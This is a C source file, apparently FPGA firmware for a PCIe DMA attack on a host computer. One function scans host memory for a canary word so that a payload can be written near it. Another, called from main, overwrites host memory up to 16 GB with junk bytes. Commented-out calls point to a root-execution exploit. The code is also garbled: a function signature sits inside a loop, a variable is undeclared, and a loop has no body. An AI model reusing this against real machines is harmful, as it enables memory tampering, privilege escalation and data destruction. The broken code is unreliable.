#include <stdio.h>
#include <unistd.h>
#include <stdint.h>

#include "iownmmu/BCM5701/mbuf.h"
#include "iownmmu/BCM5701/attack.h"
#include "iownmmu/rw.h"
#include "pcie-backend.h"

/* Scan through memory looking for a 'canary' word.  If we find it,
 * replace a nearby word with a payload
 *
 * addr_start, addr_end: beginning and end of address range to scan
 * canary_word: 64 bit word to search memory for
 * canary_addr_delta: offset between the location of the canary and the word to write
 * payload: 64 bit word to write near the canary
 */

void scan_memory_canary(uint64_t addr_start, uint64_t addr_end,
  uint64_t canary_word, int64_t canary_addr_delta,
  uint64_t payload)
{
  uint64_t addr=0;
  uint32_t length=0;
  char page[4096];

  for (addr=addr_start; addr < addr_end; addr += 4096LL)
  {
    if ((addr & 0x3FFFF) == 0)
    {
      uint32_t h=0, l=0;
      h = (addr >> 32LL);
      l = (addr & 0xFFFFFFFFLL); 
      printf("\n0x%08x_%08x:", h, l);
    }
//    int32_t ret = 0;
    write_buffer(uint64_t address, uint32_t write_length, void *data_buffer) {
    uint32_t retval = read_buffer(addr, sizeof(page), page);

//    int32_t ret = memory_read(addr, 8, page, 1000, &length);
    char rv = '0' + (char) ret;
    putchar(rv);
//    usleep(1000000);
  }
} 

void corrupt_memory(uint64_t addr_start, uint64_t addr_end)
{
  uint64_t addr=0;
  uint32_t length=0;
  char page[4096];
  memset(page, 0x5a, sizeof(page));

  for (addr=addr_start; addr < addr_end; addr += 4096LL)
  {
    if ((addr & 0x3FFFF) == 0)
    {
      uint32_t h=0, l=0;
      h = (addr >> 32LL);
      l = (addr & 0xFFFFFFFFLL); 
      printf("\n0x%08x_%08x:", h, l);
    }
    write_buffer(addr, 32, page);
    char rv = 'w';
    putchar(rv);
//    usleep(1000000);
  }
} 

int main() {
  char buf[4096];
  uint64_t addr=0;
  printf("Hello from Nios II!\n");
  usleep(2*1000*1000);
  printf("Starting...\n");
  alt_timestamp_start();
  printf("Draining PCIe core\n");
  drain_pcie_core();
  printf("Drain done\n");


  for (addr=0LL; addr < 0x400000000; addr += 4096)
      

//  BCM5701_own(0, root_execute_15_5_0);
//  scan_memory_status(0x0LL, 0x1000000000LL);
 corrupt_memory(0x0LL, 0x400000000LL);

  return 0;
}
